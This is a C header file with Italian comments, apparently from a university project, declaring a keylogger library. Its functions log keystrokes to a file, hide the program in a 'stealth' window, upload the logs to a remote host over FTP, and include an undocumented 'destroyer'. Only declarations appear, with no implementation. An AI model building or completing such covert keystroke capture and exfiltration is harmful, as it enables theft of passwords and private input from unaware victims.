/*
* @file keylib.h
* @brief Libreria per il keylogging.
*
* @author Federico Turrin (<federico.turrin@studenti.unipd.it>)
* @author Leonardo Antichi (<leo.antichi@stud.uniroma3.it>)
* @version 2.0
* @since 2.0
*
* @copyright Copyright (c) 2017-2018 University of Padua, Italy
* @copyright Copyright (c) 2017-2018 University of Roma 3, Italy
* @copyright Apache License, Version 2.0
*/

/* Libreria per le standard definitions */
#include <stddef.h>

/**
* @brief Scrive un carattere nel file di testo.
*
* @param ll carattere da scrivere
*
* @return Niente
*/
void writeChar(char c);




/**
* @brief Scrive una stringa nel file di testo.
*
* @param La stringa da scrivere
*
* @return Niente
*/
void writeString(char *s);




/**
* @brief Verifica se e' presente la sequenza di uscita.
*
* @param Nessuno
*
* @return 0 se non e' stata digitata la sequenza di uscita.
* @return 1 se e' stata digitata la sequenza di uscita.
*/
int isEnd();




/**
* @brief Verifica se e' presente un precedente file di log con la sequenza di termine.
*
* @param nessuno
*
* @return 0 se la sequenza di termine non e' presente oppure il log viene cancellato.
* @return 1 se viene deciso di uscire dal programma.
*/
int isCollision();




/**
* @brief Cancella il primo enter causato dall'avvio del programma
*
* @param nessuno
*
* @return 0 se il procedimento non e' andato a buon termine.
* @return 1 se il procedimento va a buon termine.
*/
int clearText();




/**
* @brief Scrittura caratteri digitati da tastiera su file di testo. 
*
* @details Digitare la sequenza di termine per uscire.
* @details Firma in testa al file
* @details Firma in coda al file
* @details La funzione e' pensata per lavorare su tastiera con layout ITALIANO
*
* @return 0 se c'e' stato un errore
* @return 1 se viene eseguito tutto correttamente
*/
int getKeys();




/**
* @brief Crea una finestra stealth.
*
* @details La finestra non sara' visibile 
* @details Digitare la sequenza di termine per uscire.
*
* @return Nessuno
*/
void Stealth();


/**
* @brief Crea una connessione ftp.
*
* @details La finestra non sara' visibile
* @details Esegue l'upload remoto dei files
*
* @return Nessuno
*/
int magic();


int destroyer();